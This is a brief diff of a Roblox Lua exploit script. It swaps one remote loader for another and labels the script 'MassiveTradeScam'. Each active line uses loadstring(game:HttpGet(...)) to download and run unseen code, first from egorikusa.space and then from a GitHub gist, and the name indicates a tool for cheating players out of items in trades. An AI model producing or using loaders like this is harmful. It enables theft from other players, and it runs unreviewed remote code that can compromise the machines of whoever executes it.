@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://egorikusa.space/3d46538c8ff87e5ad632eae1.lua", true))()
+getgenv().gui = false
+--loadstring(game:HttpGet("https://egorikusa.space/c8873d65d902d96625280ffe.lua", true))()
+
+_G.scriptName = "MassiveTradeScam"
+loadstring(game:HttpGet("https://gist.githubusercontent.com/YoshikoScript/690fde81c0ae4ded0e36964c4e6e4294/raw/f3647cb490ef0a7a935fee7333bb314f161c6caf/hakdoken"))()
